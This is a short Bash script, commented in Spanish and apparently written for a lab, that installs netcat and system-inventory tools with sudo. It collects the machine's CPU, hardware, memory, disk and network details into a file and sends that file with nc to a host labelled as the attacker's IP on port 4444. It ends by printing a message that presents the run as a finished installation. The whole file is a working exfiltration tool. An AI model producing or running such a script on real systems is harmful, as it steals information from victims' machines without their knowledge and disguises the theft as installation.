#!/bin/bash

# -------------------------------
# Configuración
# -------------------------------
ATACANTE_IP="192.168.244.128"
PUERTO=4444
ARCHIVO="datos.txt"

# -------------------------------
# Verificar e instalar herramientas necesarias
# -------------------------------

function instalar_si_falta() {
    if ! command -v "$1" &> /dev/null; then
        echo "[*] Instalando $1..."
        sudo apt-get update && sudo apt-get install -y "$1"
    else
        echo "[*] $1 ya está instalado."
    fi
}

instalar_si_falta "netcat"
instalar_si_falta "lshw"
instalar_si_falta "lscpu"

# -------------------------------
# Recolectar datos del sistema
# -------------------------------

echo "[*] Recolectando información del sistema..."
{
    echo "------ INFORMACIÓN DE CPU ------"
    lscpu
    echo -e "\n------ INFORMACIÓN DE HARDWARE ------"
    sudo lshw -short
    echo -e "\n------ INFORMACIÓN DE MEMORIA ------"
    free -h
    echo -e "\n------ INFORMACIÓN DEL DISCO ------"
    df -h
    echo -e "\n------ INFORMACIÓN DE RED ------"
    ip a
} > "$ARCHIVO"

echo "[*] Datos recopilados en '$ARCHIVO'"

# -------------------------------
# Enviar datos al atacante
# -------------------------------

echo "[*] Enviando datos a $ATACANTE_IP:$PUERTO..."
timeout 5 nc "$ATACANTE_IP" "$PUERTO" < $ARCHIVO
echo "[*] Datos enviados con éxito."

# -------------------------------
# Limpieza opcional
# -------------------------------
# rm -f "$ARCHIVO"  # Descomentar para borrar los datos luego de enviarlos

echo "[*] Instalación completada."
